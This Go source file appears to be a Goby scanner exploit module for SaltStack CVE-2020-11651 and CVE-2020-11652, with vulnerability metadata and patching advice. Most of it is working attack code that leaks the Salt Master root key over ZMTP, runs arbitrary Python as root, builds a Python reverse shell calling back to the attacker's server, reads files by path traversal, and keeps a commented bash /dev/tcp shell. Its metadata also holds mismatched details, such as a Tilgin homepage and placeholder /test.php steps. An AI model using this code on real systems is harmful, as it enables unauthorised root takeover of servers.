package exploits

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"github.com/vmihailenco/msgpack"
	"log"
	"net"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "SaltStack Remote Command Execution Vulnerability",
    "Description": "<p>SaltStack is a Python-based C/S architecture configuration management tool. A foreign security team disclosed that SaltStack has an authentication bypass vulnerability (CVE-2020-11651) and a directory traversal vulnerability (CVE-2020-11652). In the CVE-2020-11651 authentication bypass vulnerability, attackers can bypass the verification logic of the Salt Master by crafting malicious requests and invoke unauthorized function features, leading to a remote command execution vulnerability.</p>",
    "Product": "SaltStack",
    "Homepage": "http://www.tilgin.com/",
    "DisclosureDate": "2020-05-05",
    "Author": "pspongebob@sina.com",
    "FofaQuery": "protocol==\"zmtp\"",
    "Level": "3",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.8",
    "VulType": [
        "Command Execution"
    ],
    "Impact": "<p>The ClearFuncs class does not restrict the _send_pub() method when handling authorization, allowing messages to be published in the queue and executed with root privileges.</p><p>ClearFuncs also exposes the _prep_auth_info() method, which can be used to obtain the 'root key'. With the obtained 'root key', remote command execution can be performed on the main service.</p><p>SaltStack &lt; 2019.2.4</p><p>SaltStack &lt; 3000.2</p>",
    "Recommendation": "<p>1. Upgrade to a secure version or above, and it is recommended to take snapshot backup measures before upgrading. For secure version download, refer to: <a href=\"https://repo.saltstack.com\">https://repo.saltstack.com</a></p><p>2. Set SaltStack to update automatically to receive patches promptly.</p><p>3. Configure the default listening ports of Salt Master (default 4505 and 4506) to be inaccessible from the public network or only accessible to trusted entities.</p>",
    "References": [
        "http://lists.opensuse.org/opensuse-security-announce/2020-04/msg00047.html",
        "http://packetstormsecurity.com/files/157560/Saltstack-3000.1-Remote-Code-Execution.html",
        "http://www.vmware.com/security/advisories/VMSA-2020-0009.html",
        "https://docs.saltstack.com/en/latest/topics/releases/2019.2.4.html",
        "https://github.com/saltstack/salt/blob/v3000.2_docs/doc/topics/releases/3000.2.rst",
        "https://www.debian.org/security/2020/dsa-4676",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-11651",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11651"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,goby_shell_linux",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "CVEIDs": [
        "CVE-2020-11651"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "GobyQuery": "protocol==\"zmtp\"",
    "Translation": {
        "CN": {
            "Name": "SaltStack远程命令执行",
            "Product": "SaltStack",
            "Description": "<p>SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。影响版本SaltStack &lt; 2019.2.4SaltStack &lt; 3000.2</p>",
            "Recommendation": "<p>1、升级至安全版本及其以上，升级前建议做好快照备份措施。安全版本下载地址参考：<a href=\"https://repo.saltstack.com\">https://repo.saltstack.com</a></p><p>2、设置SaltStack为自动更新，及时获取相应补丁。</p><p>3、将Salt Master默认监听端口（默认4505 和 4506）设置为禁止对公网开放，或仅对可信对象开放。</p>",
            "Impact": "<p>ClearFuncs&nbsp;类在处理授权时，并未限制 _send_pub() 方法，该方法直接可以在发布队列消息，发布的消息会通过 root 身份权限进行执行命令。</p><p>ClearFuncs 还公开了 _prep_auth_info() 方法，通过该方法可以获取到”root key”，通过获取到的”root key”可以在主服务上执远程调用命令。</p><p>SaltStack &lt; 2019.2.4</p><p>SaltStack &lt; 3000.2</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "SaltStack Remote Command Execution Vulnerability",
            "Product": "SaltStack",
            "Description": "<p>SaltStack is a Python-based C/S architecture configuration management tool. A foreign security team disclosed that SaltStack has an authentication bypass vulnerability (CVE-2020-11651) and a directory traversal vulnerability (CVE-2020-11652). In the CVE-2020-11651 authentication bypass vulnerability, attackers can bypass the verification logic of the Salt Master by crafting malicious requests and invoke unauthorized function features, leading to a remote command execution vulnerability.</p>",
            "Recommendation": "<p>1. Upgrade to a secure version or above, and it is recommended to take snapshot backup measures before upgrading. For secure version download, refer to: <a href=\"https://repo.saltstack.com\">https://repo.saltstack.com</a></p><p>2. Set SaltStack to update automatically to receive patches promptly.</p><p>3. Configure the default listening ports of Salt Master (default 4505 and 4506) to be inaccessible from the public network or only accessible to trusted entities.</p>",
            "Impact": "<p>The ClearFuncs class does not restrict the _send_pub() method when handling authorization, allowing messages to be published in the queue and executed with root privileges.</p><p>ClearFuncs also exposes the _prep_auth_info() method, which can be used to obtain the 'root key'. With the obtained 'root key', remote command execution can be performed on the main service.</p><p>SaltStack &lt; 2019.2.4</p><p>SaltStack &lt; 3000.2</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "Variables": {},
    "PocId": "9960"
}`
	// recvZMQMessage 解析zmq消息的简易实现
	// 构造完整的zmtp包
	type zmqMsg struct {
		ok      bool
		flag    byte
		hasMore bool
		size    uint64
		data    []byte
		fields  interface{}
	}

	var genSaltStackCmdMsgPack_Sed1271a = func(msg map[string]interface{}) []byte {
		var genMsgPack = func(msg map[string]interface{}) []byte {
			b, err := msgpack.Marshal(msg)
			if err != nil {
				return b
			}
			return b
		}

		data := genMsgPack(map[string]interface{}{
			"enc":  "clear",
			"load": msg,
		})

		zmp := new(bytes.Buffer)
		zmp.Write([]byte{0x01, 0x00})
		if size := len(data); size > 0xff {
			zmp.WriteByte(0x02) //64 bit
			binary.Write(zmp, binary.BigEndian, uint64(size))
		} else {
			zmp.WriteByte(0x00)
			zmp.WriteByte(byte(size))
		}
		zmp.Write(data)

		return zmp.Bytes()
	}
	var recvZMQMessages_Sed1271a = func(c net.Conn) (ret []zmqMsg) {
		var recvZmqCmdMessage = func(c net.Conn) (ret zmqMsg) {
			if err := binary.Read(c, binary.BigEndian, &ret.flag); err != nil {
				return
			}

			// big int
			if ret.flag&0x02 == 0x02 {
				if err := binary.Read(c, binary.BigEndian, &ret.size); err != nil {
					log.Println(err)
					return
				}
			} else {
				var s byte
				if err := binary.Read(c, binary.BigEndian, &s); err != nil {
					log.Println(err)
					return
				}
				ret.size = uint64(s)
			}

			if ret.size > 0 {
				var offset uint64 = 0
				buf := make([]byte, ret.size)
				for {
					if n, _ := c.Read(buf[offset:]); n == 0 {
						break
					} else {
						offset += uint64(n)
					}
					ret.data = append(ret.data, buf[:offset]...)
					if offset >= ret.size {
						break
					}
				}

				if err := msgpack.Unmarshal(ret.data, &ret.fields); err != nil {
					log.Println(err)
				}
			}

			if ret.flag&0x01 == 0x01 {
				// has more
				ret.hasMore = true
			}
			ret.ok = true

			return ret
		}

		for {
			if msg := recvZmqCmdMessage(c); msg.ok {
				ret = append(ret, msg)

				if !msg.hasMore {
					break
				}
			} else {
				break
			}
		}
		return
	}
	var recvSaltStackKey_Sed1271a = func(c net.Conn) (key string) {
		var err error
		var saltstackHexstringToBytes = func(hexStr string) []byte {
			decoded, err := hex.DecodeString(hexStr)
			if err != nil {
				panic(err)
			}
			return decoded
		}

		var netReadUntilTimeout = func(conn net.Conn) ([]byte, error) {
			var err error
			var n int
			first := true

			buf := make([]byte, 0, 4096) // big buffer
			tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
			for {
				n, err = conn.Read(tmp)
				if err != nil {
					//if err != io.EOF {
					//	fmt.Println("read error:", err)
					//}
					break
				}

				if first {
					conn.SetReadDeadline(time.Now().Add(1 * time.Second))
					first = false
				}

				//fmt.Println("got", n, "bytes.")
				buf = append(buf, tmp[:n]...)
			}
			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			return buf, err
		}

		/*
			greeting
			ZeroMQ Message Transport Protocol, Frames: 1
			    Greeting
			        Signature: ff00000000000000017f
			        ZMTP Version: 0x0300
			            ZMTP Major Version: 3
			            ZMTP Minor Version: 0
			        ZMTP Security Mechanism: NULL
			        Is a ZMTP Server: False
			https://github.com/zeromq/gomq/blob/44a15e88b2fd71315154c8593ab778e0b099c55b/zmtp/protocol.go
			signaturePrefix = 0xFF
			signatureSuffix = 0x7F
		*/
		_, err = c.Write(saltstackHexstringToBytes("ff00000000000000017f03004e554c4c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"))
		if err != nil {
			return ""
		}

		var recvBuf []byte
		if recvBuf, err = netReadUntilTimeout(c); err != nil && !bytes.Contains(recvBuf, []byte("READY")) {
			return ""
		}

		/*
			cmd ping
			ZeroMQ Message Transport Protocol, Frames: 3
			    Command READY: Socket-Type: REQ, Identity: (empty)
			        0000 0100 = Flags: 0x04 (Command)
			            .... ...0 = Has More: No (0)
			            .... ..0. = 64-bit Length: No (0)
			            .... .1.. = Is Command: Yes (1)
			        Payload Length: 38
			        Command Name: READY
			        READY Command: 0b536f636b65742d5479706500000003524551084964656e…
			            Metadata Key: Socket-Type
			            Metadata Value: REQ
			            Metadata Key: Identity
			    Empty [Has More]
			        0000 0001 = Flags: 0x01 (More)
			            .... ...1 = Has More: Yes (1)
			            .... ..0. = 64-bit Length: No (0)
			            .... .0.. = Is Command: No (0)
			        Payload Length: 0
			    Data, Length: 26
		*/
		_, err = c.Write(saltstackHexstringToBytes("04260552454144590b536f636b65742d5479706500000003524551084964656e74697479000000000100001a82a46c6f616481a3636d64a470696e67a3656e63a5636c656172"))
		if err != nil {
			return ""
		}

		if recvBuf, err = netReadUntilTimeout(c); err != nil && !bytes.Contains(recvBuf, []byte("ping")) {
			return ""
		}

		// cmd _prep_auth_info
		/*
			0000   01 00 00 25 82 a3 65 6e 63 a5 63 6c 65 61 72 a4   ...%..enc.clear.
			0010   6c 6f 61 64 81 a3 63 6d 64 af 5f 70 72 65 70 5f   load..cmd._prep_
			0020   61 75 74 68 5f 69 6e 66 6f                        auth_info

		*/
		prepData := genSaltStackCmdMsgPack_Sed1271a(map[string]interface{}{
			"cmd": "_prep_auth_info",
		})
		//prepData := hexstringToBytes("0100002582a46c6f616481a3636d64af5f707265705f617574685f696e666fa3656e63a5636c656172")
		_, err = c.Write(prepData)
		if err != nil {
			return ""
		}

		/**
		0000   02 00 00 00 45 00 00 ac 00 00 40 00 40 06 00 00   ....E.....@.@...
		0010   7f 00 00 01 7f 00 00 01 11 9a f4 38 ef 31 84 7e   ...........8.1.~
		0020   03 d7 05 16 80 18 18 e8 fe a0 00 00 01 01 08 0a   ................
		0030   5a 55 4f 83 5a 55 4f 7c 01 00 00 74 94 a4 75 73   ZUO.ZUO|...t..us
		0040   65 72 b7 55 73 65 72 41 75 74 68 65 6e 74 69 63   er.UserAuthentic
		0050   61 74 69 6f 6e 45 72 72 6f 72 81 a4 72 6f 6f 74   ationError..root
		0060   da 00 4c 73 6d 6b 56 68 2f 32 7a 45 2f 36 37 41   ..LsmkVh/2zE/67A
		0070   54 72 4e 55 41 56 62 6f 65 47 69 44 6e 43 35 7a   TrNUAVboeGiDnC5z
		0080   4b 46 58 70 2f 33 4a 59 7a 2b 7a 62 69 78 56 34   KFXp/3JYz+zbixV4
		0090   42 46 42 57 35 52 57 79 5a 65 67 44 53 33 32 73   BFBW5RWyZegDS32s
		00a0   68 76 31 35 78 50 4e 2b 36 38 31 52 66 73 3d 90   hv15xPN+681Rfs=.
		*/
		if msgs := recvZMQMessages_Sed1271a(c); len(msgs) > 1 {
			//if _, err = c.Read(buf); err != nil || bytes.Contains(buf, []byte("UserAuthenticationError")) {
			//
			//	return true
			//}
			if bytes.Contains(msgs[1].data, []byte("UserAuthenticationError")) {
				return msgs[1].fields.([]interface{})[2].(map[string]interface{})["root"].(string)
			}
		}

		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			c, err := httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				return false
			}
			defer c.Close()

			if key := recvSaltStackKey_Sed1271a(c); len(key) > 0 {
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			c, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo)
			if err != nil {
				return expResult
			}
			defer c.Close()

			var readSaltStackFile = func(hostinfo, path string) (ret string, err error) {
				var c net.Conn
				c, err = httpclient.GetTCPConn(hostinfo)
				if err != nil {
					return
				}
				defer c.Close()

				var key string
				if key = recvSaltStackKey_Sed1271a(c); len(key) == 0 {
					err = errors.New("recv key failed")
					return
				}

				/*
					0000   02 00 00 00 45 00 00 d8 00 00 40 00 40 06 00 00   ....E.....@.@...
					0010   7f 00 00 01 7f 00 00 01 d1 51 11 9a 0d 45 74 4c   .........Q...EtL
					0020   9d 84 b0 25 80 18 18 e7 fe cc 00 00 01 01 08 0a   ...%............
					0030   5c 34 bd a7 5c 34 bd a7 01 00 00 a0 82 a3 65 6e   \4..\4........en
					0040   63 a5 63 6c 65 61 72 a4 6c 6f 61 64 85 a3 6b 65   c.clear.load..ke
					0050   79 da 00 4c 73 6d 6b 56 68 2f 32 7a 45 2f 36 37   y..LsmkVh/2zE/67
					0060   41 54 72 4e 55 41 56 62 6f 65 47 69 44 6e 43 35   ATrNUAVboeGiDnC5
					0070   7a 4b 46 58 70 2f 33 4a 59 7a 2b 7a 62 69 78 56   zKFXp/3JYz+zbixV
					0080   34 42 46 42 57 35 52 57 79 5a 65 67 44 53 33 32   4BFBW5RWyZegDS32
					0090   73 68 76 31 35 78 50 4e 2b 36 38 31 52 66 73 3d   shv15xPN+681Rfs=
					00a0   a3 63 6d 64 a5 77 68 65 65 6c a3 66 75 6e af 66   .cmd.wheel.fun.f
					00b0   69 6c 65 5f 72 6f 6f 74 73 2e 72 65 61 64 a4 70   ile_roots.read.p
					00c0   61 74 68 ab 2f 65 74 63 2f 70 61 73 73 77 64 a7   ath./etc/passwd.
					00d0   73 61 6c 74 65 6e 76 a4 62 61 73 65               saltenv.base
				*/
				prepData := genSaltStackCmdMsgPack_Sed1271a(map[string]interface{}{
					"key":     key,
					"cmd":     "wheel",
					"fun":     "file_roots.read",
					"path":    path,
					"saltenv": "base",
				})

				_, err = c.Write(prepData)
				if err != nil {
					return
				}

				if msgs := recvZMQMessages_Sed1271a(c); len(msgs) > 1 {
					if fields, ok := msgs[1].fields.(map[string]interface{}); ok {
						if fields, ok = fields["data"].(map[string]interface{}); ok {
							if returns, ok := fields["return"].([]interface{}); ok && len(returns) > 0 {
								ret = returns[0].(map[string]interface{})[path].(string)
								return
							}
						}
					}
				}
				err = errors.New("no content")

				return
			}

			if key := recvSaltStackKey_Sed1271a(c); len(key) > 0 {

				var waitSessionCh chan string
				var path string
				var code string
				if ss.Params["AttackType"].(string) == "goby_shell_linux" {
					waitSessionCh = make(chan string)
					if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
						log.Println("[WARNING] godclient bind failed", err)
						return expResult
					} else {
						//cmd = fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", godclient.GetGodServerHost(), rp)
						code = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("` + godclient.GetGodServerHost() + `", ` + rp + `));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);`
					}
				} else {
					cmd := ss.Params["cmd"].(string)
					path = "/tmp/" + goutils.RandomHexString(4)
					cmd = cmd + " > " + path
					code = "import subprocess;subprocess.call('" + cmd + "',shell=True)"
				}

				prepData := genSaltStackCmdMsgPack_Sed1271a(map[string]interface{}{
					"key":     key,
					"cmd":     "runner",
					"fun":     "salt.cmd",
					"saltenv": "base",
					"user":    "sudo_user",
					"kwarg": map[string]interface{}{
						"fun":  "cmd.exec_code",
						"lang": "python",
						"code": code,
					},
					"jid": time.Now().Format("20060102150405") + "133934",
				})

				_, err = c.Write(prepData)
				if err != nil {
					return expResult
				}

				if msgs := recvZMQMessages_Sed1271a(c); len(msgs) > 1 {
					ok := false
					for k, _ := range msgs[1].fields.(map[string]interface{}) {
						if k == "tag" {
							ok = true
						}
						//log.Println(k, v)
					}
					if !ok {
						return expResult
					}
				} else {
					return expResult
				}

				// 等待任务执行
				time.Sleep(time.Second * 20)
				c.Close()
				//time.Sleep(time.Second * 30)

				if waitSessionCh != nil {
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if len(webConsleID) > 0 {
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							}
							expResult.Success = true
						}
					case <-time.After(time.Second * 10):
					}
				} else {
					// 利用CVE-2020-11652读文件
					//log.Println("not impl CVE-2020-11652")

					if content, err := readSaltStackFile(expResult.HostInfo.HostInfo, path); err == nil {
						expResult.Success = true
						expResult.Output = content
					}
				}
			}
			return expResult
		},
	))
}

// generate by genpoc: ./genpoc -out ../../exploits/SaltStack_RCE_CVE_2020_11651.go -cve CVE-2020-11651
